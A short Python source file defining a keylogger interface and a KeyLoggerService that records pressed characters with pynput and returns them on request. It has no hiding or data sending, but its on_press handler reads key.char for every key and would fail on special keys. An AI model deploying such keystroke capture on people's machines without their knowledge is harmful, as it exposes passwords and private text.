from pynput import keyboard
from abc import ABC, abstractmethod
from typing import List

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.char_list = []
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        self.char_list.append(key.char)

    def start_logging(self) -> None:
        self.listener.start()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        tmp_list = self.char_list.copy()
        self.char_list.clear()
        return tmp_list


